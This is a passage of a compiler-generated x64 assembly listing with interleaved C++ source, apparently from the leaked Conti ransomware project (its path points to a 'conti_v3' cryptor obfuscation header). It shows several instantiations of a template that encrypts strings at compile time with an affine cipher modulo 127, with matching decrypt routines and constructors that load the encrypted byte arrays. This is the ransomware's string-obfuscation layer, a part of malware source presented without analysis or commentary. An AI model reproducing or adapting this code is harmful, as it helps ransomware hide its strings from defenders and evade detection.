  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 62	 mov	 BYTE PTR [rcx+1], 98	; 00000062H
  00007	c6 41 02 1e	 mov	 BYTE PTR [rcx+2], 30
  0000b	c6 41 03 26	 mov	 BYTE PTR [rcx+3], 38	; 00000026H
  0000f	c6 41 04 1e	 mov	 BYTE PTR [rcx+4], 30
  00013	c6 41 05 5e	 mov	 BYTE PTR [rcx+5], 94	; 0000005eH
  00017	c6 41 06 1e	 mov	 BYTE PTR [rcx+6], 30
  0001b	c6 41 07 1e	 mov	 BYTE PTR [rcx+7], 30
  0001f	c6 41 08 1e	 mov	 BYTE PTR [rcx+8], 30
  00023	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00027	48 8b c1	 mov	 rax, rcx
  0002a	c3		 ret	 0
??0?$MetaBuffer@$06$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<7,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 31	 sub	 ecx, 49			; 00000031H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 42	 mov	 BYTE PTR [rcx+1], 66	; 00000042H
  00007	c6 41 02 31	 mov	 BYTE PTR [rcx+2], 49	; 00000031H
  0000b	c6 41 03 33	 mov	 BYTE PTR [rcx+3], 51	; 00000033H
  0000f	c6 41 04 31	 mov	 BYTE PTR [rcx+4], 49	; 00000031H
  00013	c6 41 05 1c	 mov	 BYTE PTR [rcx+5], 28
  00017	c6 41 06 31	 mov	 BYTE PTR [rcx+6], 49	; 00000031H
  0001b	c6 41 07 25	 mov	 BYTE PTR [rcx+7], 37	; 00000025H
  0001f	c6 41 08 31	 mov	 BYTE PTR [rcx+8], 49	; 00000031H
  00023	c6 41 09 31	 mov	 BYTE PTR [rcx+9], 49	; 00000031H
  00027	c6 41 0a 31	 mov	 BYTE PTR [rcx+10], 49	; 00000031H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 0c 00 00 00	 mov	 eax, 12
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 7c	 mov	 BYTE PTR [rcx+1], 124	; 0000007cH
  00007	c6 41 02 0c	 mov	 BYTE PTR [rcx+2], 12
  0000b	c6 41 03 46	 mov	 BYTE PTR [rcx+3], 70	; 00000046H
  0000f	c6 41 04 0c	 mov	 BYTE PTR [rcx+4], 12
  00013	c6 41 05 26	 mov	 BYTE PTR [rcx+5], 38	; 00000026H
  00017	c6 41 06 0c	 mov	 BYTE PTR [rcx+6], 12
  0001b	c6 41 07 6f	 mov	 BYTE PTR [rcx+7], 111	; 0000006fH
  0001f	c6 41 08 0c	 mov	 BYTE PTR [rcx+8], 12
  00023	c6 41 09 0c	 mov	 BYTE PTR [rcx+9], 12
  00027	c6 41 0a 0c	 mov	 BYTE PTR [rcx+10], 12
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 03 00 00 00	 mov	 eax, 3
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 25	 mov	 BYTE PTR [rcx+1], 37	; 00000025H
  00007	c6 41 02 03	 mov	 BYTE PTR [rcx+2], 3
  0000b	c6 41 03 07	 mov	 BYTE PTR [rcx+3], 7
  0000f	c6 41 04 03	 mov	 BYTE PTR [rcx+4], 3
  00013	c6 41 05 58	 mov	 BYTE PTR [rcx+5], 88	; 00000058H
  00017	c6 41 06 03	 mov	 BYTE PTR [rcx+6], 3
  0001b	c6 41 07 76	 mov	 BYTE PTR [rcx+7], 118	; 00000076H
  0001f	c6 41 08 03	 mov	 BYTE PTR [rcx+8], 3
  00023	c6 41 09 03	 mov	 BYTE PTR [rcx+9], 3
  00027	c6 41 0a 03	 mov	 BYTE PTR [rcx+10], 3
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 6a 00 00 00	 mov	 eax, 106		; 0000006aH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 39	 mov	 BYTE PTR [rcx+1], 57	; 00000039H
  00007	c6 41 02 6a	 mov	 BYTE PTR [rcx+2], 106	; 0000006aH
  0000b	c6 41 03 21	 mov	 BYTE PTR [rcx+3], 33	; 00000021H
  0000f	c6 41 04 6a	 mov	 BYTE PTR [rcx+4], 106	; 0000006aH
  00013	c6 41 05 2f	 mov	 BYTE PTR [rcx+5], 47	; 0000002fH
  00017	c6 41 06 6a	 mov	 BYTE PTR [rcx+6], 106	; 0000006aH
  0001b	c6 41 07 77	 mov	 BYTE PTR [rcx+7], 119	; 00000077H
  0001f	c6 41 08 6a	 mov	 BYTE PTR [rcx+8], 106	; 0000006aH
  00023	c6 41 09 6a	 mov	 BYTE PTR [rcx+9], 106	; 0000006aH
  00027	c6 41 0a 6a	 mov	 BYTE PTR [rcx+10], 106	; 0000006aH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
